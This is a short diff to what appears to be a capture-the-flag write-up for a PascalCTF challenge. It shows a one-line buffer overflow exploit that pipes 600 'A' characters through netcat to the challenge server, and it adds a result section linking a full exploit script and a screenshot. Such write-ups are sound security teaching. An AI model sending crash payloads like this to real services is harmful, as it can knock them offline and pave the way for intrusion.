@@ -16,3 +16,12 @@ Why bother reversing the algorithm when you can just smash the stack? I sent 600
 **The Exploit:**
 ```bash
 python3 -c 'print("A"*600)' | nc albo.ctf.pascalctf.it 7004
+
+```
+### Result: 
+
+heck out the full exploit script here: [exploit.py](./exploit.py)
+
+
+![PoC](./screenshot.jpg)
+
